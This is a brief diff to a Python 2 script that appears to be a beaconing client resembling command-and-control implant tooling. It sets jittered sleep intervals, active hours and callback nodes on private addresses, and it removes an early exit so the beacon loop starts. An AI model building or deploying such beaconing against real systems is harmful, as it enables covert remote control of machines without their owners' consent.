@@ -23,7 +23,7 @@ MIN_SLEEP_INT = 60
 MAX_SLEEP_INT = 600
 ACTIVE_DAYS = ('M','T','W','Th','F','Sa','Su')
 ACTIVE_HOURS = ('0001','2359')
-NODES = [('http','192.168.2.2','80'),('socket','192.168.2.3','5585')]
+NODES = [('http_get','192.168.2.2','80'),('http_get','192.168.2.3','5585')]
 
 # global flag
 continue_beacon = True
@@ -66,9 +66,9 @@ def main():
     print "Building controller..."
     controller = Controller(beacons, commands, decoders)
     
-    print "finished!"
-    exit()
+    print "Starting beaconer..."
     start_beacon_loop(controller)
+    print "finished!"
 
 if __name__ == "__main__":
     main()
